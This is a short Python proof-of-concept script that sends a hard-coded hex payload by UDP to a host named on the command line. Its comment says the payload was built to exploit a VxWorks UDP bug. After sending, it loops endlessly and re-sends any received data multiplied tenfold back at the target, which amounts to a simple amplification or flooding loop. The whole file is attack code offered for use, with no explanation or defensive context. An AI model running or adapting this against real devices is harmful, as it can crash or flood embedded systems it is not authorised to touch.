import socket


#Sending random payload - its originally created for exploiting a bug in vxworks UDP vulnerability
PAYLOAD_HEX = b'c6ff7e200000000000000020001a0860000000400000004888888880000000110000001100001111111111111111111111111111'
UDP_IP_ADDRESS = '0.0.0.0'
UDP_PORT_NO = 88
NoOfX = 10 # nof of times to send the payload

def poc(host, rpcPort=111):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(PAYLOAD_HEX,(host,rpcPort))

if __name__ == '__main__':
    import sys
    #poc(sys.argv[1])
    #ip address to send UDP payload
    host = sys.argv[1]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #for reusing the address
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    #bind to address
    sock.bind((UDP_IP_ADDRESS, UDP_PORT_NO))
    print("Sending payload....")
    sock.sendto(PAYLOAD_HEX,(host,UDP_PORT_NO))
    print("Payload sent")
    while True:
        data,addr = sock.recvfrom(10)
        print("Message:  ", data)
        data = data * NoOfX
        sock.sendto(data,(host,UDP_PORT_NO))




